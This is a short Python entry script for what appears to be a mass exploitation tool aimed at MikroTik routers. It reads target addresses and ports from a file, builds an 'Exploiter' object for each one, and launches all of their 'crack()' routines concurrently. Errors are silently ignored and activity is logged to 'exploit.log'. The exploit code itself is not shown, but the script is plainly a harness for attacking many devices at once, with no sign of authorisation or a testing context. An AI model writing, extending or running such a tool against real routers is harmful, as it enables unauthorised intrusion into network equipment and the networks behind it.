from app.config import logger_setup
from app.exploit_tool import Exploiter
from app.source_loader import load_mikrotik_list_from_file
import asyncio

async def main():
    tasks = []
    mikrotik_list = load_mikrotik_list_from_file("mikrotiks.txt")
    for mikrotik in mikrotik_list:
        exploiter = Exploiter(address=mikrotik.address, port=mikrotik.port)
        tasks.append(asyncio.create_task(exploiter.crack()))

    for task in tasks:
        try:
            await task
        except Exception:
            pass

if __name__ == "__main__":
    logger_setup("exploit.log")
    asyncio.run(main())

    
